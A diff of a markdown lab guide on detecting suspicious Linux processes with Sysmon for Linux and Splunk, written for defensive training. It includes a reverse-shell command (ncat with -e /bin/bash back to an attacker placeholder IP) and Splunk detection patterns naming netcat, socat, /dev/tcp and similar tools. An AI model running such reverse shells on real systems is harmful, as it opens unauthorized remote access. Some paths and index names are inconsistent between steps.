@@ -1,49 +1,71 @@
-# Monitoring and Investigation of Suspicious Process Execution (Linux)
+**Objective**: Detect and investigate suspicious processes running on an Ubuntu server using practical tools like Sysmon for Linux and Splunk. Simulate an attack by running a reverse shell.
 
-## Inputs Configuration for Splunk
+- **Detailed level**: Full
+- **Difficulty level**: Medium
 
-```sh
-nano /opt/splunkforwarder/etc/system/local/inputs.conf
-```
+---
 
-```sh
-[monitor:///var/log/sysmon.log]
-sourcetype = syslog
-index = linux_os_logs
-```
+### **Step-by-Step Guide**
 
-- Installation of **Sysmon for Linux** with an advanced XML configuration to detect multiple MITRE ATT&CK techniques.
+---
 
-## Install Sysmon for Linux
+### **Step 1: Prerequisites**
+
+1. **Ubuntu Server** with sudo privileges.
+2. **Splunk Universal Forwarder** installed and configured to forward logs.
+3. **Sysmon for Linux** installed for monitoring process creation.
+
+---
+
+### **Step 2: Install Sysmon for Linux**
 
 - [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 - [Recommended base config: MSTIC Sysmon Config](https://raw.githubusercontent.com/microsoft/MSTIC-Sysmon/main/linux/configs/main.xml)
 
-```sh
-# Download Microsoft packages repo
-wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
-sudo dpkg -i packages-microsoft-prod.deb
+1. **Install Sysmon**:
 
-# Update package list
-sudo apt-get update
+   - Clone the Sysmon repository:
 
-# Install Sysmon for Linux
-sudo apt-get install sysmonforlinux -y
-```
+     ```bash
 
-## Configure Sysmon with Advanced Rules
+     git clone https://github.com/Sysinternals/SysmonForLinux.git
+     cd SysmonForLinux
 
-#### Create the configuration file
+     ```
 
-```sh
-nano sysmon-config.xml
-```
+   - Build and install Sysmon:
 
-## Paste the advanced XML configuration
+     ```bash
 
-- This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.
+     sudo apt update
+     sudo apt install gcc make -y
+     make
+     sudo make install
 
-```sh
+     ```
+
+   - Confirm the installation:
+
+     ```bash
+
+     sysmon -v
+     ```
+
+2. **Configure Sysmon**:
+
+   - Create a Sysmon configuration file:
+
+     ```bash
+
+     sudo nano /etc/sysmon/sysmon.conf
+
+     ```
+
+   - This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.
+
+   - Add the following content to monitor process creation:
+
+```xml
 <!--
     SysmonForLinux
 
@@ -255,123 +277,169 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 </Sysmon>
 ```
 
-## Start Sysmon with the configuration
+- Save and restart Sysmon:
 
-```sh
-sudo sysmon -i /etc/sysmon-config.xml
-sudo systemctl restart sysmon
-sudo systemctl status sysmon
+  ```bash
 
-sudo sysmon -c /etc/sysmon-config.xml
+  sudo sysmon -i sysmon-config.xml
 
-sudo journalctl -u sysmon.service -f
-```
+  systemctl restart sysmon
 
-## Simulate an Attack (Reverse Shell)
+  ```
 
-#### On attacker machine
+---
 
-```sh
-sudo apt install ncat net-tools -y
-sudo ncat -lnvp 4444 -k
-```
+### **Step 3: Simulate a Suspicious Process Execution**
 
-#### On victim machine
+1. **Simulate a Reverse Shell**:
 
-```sh
-sudo apt install ncat net-tools -y
-ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
-```
+   - On the **attacking machine**, use Netcat to create a listener:
 
-#### Verify the connection
+     ```bash
+     sudo apt install ncat net-tools -y
 
-```sh
-lsof -i :4444
-netstat -tulnp | grep 4444
-```
+     ncat -lvnp 4444
 
-## Analysis in Splunk
+     ```
 
-#### a. All Sysmon logs:
+   - On the **target server**, execute the reverse shell:
 
-```sh
-index="linux_os_logs"  process=sysmon TechniqueName=Command
+     ```bash
 
-index="linux_os_logs"  process=sysmon TechniqueName=Command "ncat"
-```
+     sudo apt install ncat net-tools -y
+     ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
 
-#### b. Suspicious command execution:
+     ```
 
-```sh
-index="linux_os_logs" process=sysmon TechniqueName=Command
-(ncat OR netcat OR "bash -i" OR curl OR wget OR "python -c" OR "perl -e" OR "php -r" OR socat OR "/dev/tcp" OR "chmod 777" OR scp)
-```
+   - Replace `<attacker-ip>` with the IP address of the attacking machine.
 
-#### c. Command stats by host and time:
+2. **Verify the Process Execution on Victim machine**:
 
-```sh
-index="linux_os_logs" process=sysmon TechniqueName=Command
-| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
-| stats count by host, command_executed, _time
-| sort - count
-```
+   - List running processes on the Ubuntu server:
 
-#### d. Timechart of suspicious commands:
+     ```bash
 
-```sh
-index="linux_os_logs" process=sysmon TechniqueName=Command
-| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
-| timechart span=30m count by command_executed
-```
+     sudo lsof -i :4444
 
-## Persistence monitoring (cron/systemd changes):
+     netstat -tulnp | grep 4444
 
-#### a. Cron and systemd events per host
+     ps -p <PID> -o pid,user,cmd //Check Running Processes
 
-```sh
-index="linux_os_logs" process=sysmon
-| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
-| stats count by host, _raw, _time
-| sort -_time
-```
+     ```
 
-#### b. Cron/systemd events aggregated hourly
+---
 
-```sh
-index="linux_os_logs" process=sysmon
-| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
-| bin _time span=1h
-| stats count by _time, host
-| sort _time
-```
+### **Step 4: Configure Splunk for Log Monitoring**
 
-#### c. Timechart of cron/systemd events
+1. **Set up Sysmon logs forwarding**:
 
-```sh
-index="linux_os_logs" process=sysmon
-| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
-| timechart span=1h count by host
-```
+   - Configure Splunk Universal Forwarder to monitor Sysmon logs:
 
-#### d. Suspicious commands executed
+     ```bash
 
-```sh
-index="linux_os_logs" process=sysmon
-| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)\s(?P<command_args>.*)"
-| stats count by host, command_executed, command_args, _time
-| sort -count
-```
+     sudo nano /opt/splunkforwarder/etc/system/local/inputs.conf
 
-## Incident Response
+     ```
 
-#### Kill the Malicious Process:
+   - Add the following configuration:
 
-```sh
-ps aux | grep bash
-```
+     ```
 
-#### Terminate the process:
+     [monitor:///var/log/sysmon.log]
+     sourcetype = syslog
+     index = linux_os_logs
 
-```sh
-sudo kill <pid>
-```
+     ```
+
+   - Save and restart the Splunk Universal Forwarder:
+
+     ```bash
+
+     sudo /opt/splunkforwarder/bin/splunk restart
+
+     ```
+
+2. **Verify Log Forwarding**:
+
+   - Check if logs are visible in Splunk using this query:
+
+     ```
+
+     index=linux_logs sourcetype=syslog
+
+     ```
+
+---
+
+### **Step 5: Analyze Logs in Splunk**
+
+1. **Detect Suspicious Processes**:
+
+   - Run a query to find all process creation events:
+
+     ```bash
+
+     index="linux_os_logs"  process=sysmon TechniqueName=Command
+
+     index="linux_os_logs"  process=sysmon TechniqueName=Command "ncat"
+
+     index="linux_os_logs" process=sysmon TechniqueName=Command (ncat OR netcat OR "bash -i" OR curl OR wget OR "python -c" OR "perl -e" OR "php -r" OR socat OR "/dev/tcp" OR "chmod 777" OR scp)
+
+     index="linux_os_logs" process=sysmon TechniqueName=Command
+     | rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
+     | stats count by host, command_executed, _time
+     | sort - count
+
+     index="linux_os_logs" process=sysmon TechniqueName=Command
+     | rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
+     | timechart span=30m count by command_executed
+
+   index="linux_os_logs" process=sysmon
+   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
+   | stats count by host, \_raw, \_time
+   | sort -\_time
+
+   index="linux_os_logs" process=sysmon
+   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
+   | bin \_time span=1h
+   | stats count by \_time, host
+   | sort \_time
+
+   index="linux_os_logs" process=sysmon
+   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
+   | timechart span=1h count by host
+
+   index="linux_os_logs" process=sysmon
+   | rex field=\_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)\s(?P<command_args>.\*)"
+   | stats count by host, command_executed, command_args, \_time
+   | sort -count
+   ```
+
+2. **Visualize Process Trends**:
+   - Create a dashboard in Splunk to monitor:
+     - Frequently executed processes.
+     - Unusual parent-child relationships.
+
+### **Step 6: Incident Response**
+
+1. **Kill the Malicious Process**:
+
+   - Identify the process ID (PID):
+
+     ```bash
+     ps aux | grep bash
+
+     ```
+
+   - Terminate the process:
+
+     ```bash
+     sudo kill <pid>
+
+     ```
+
+2. **Investigate the Source**:
+   - Analyze Sysmon logs in Splunk for:
+     - The process owner.
+     - Commands executed by the process.
+     - Network connections initiated.
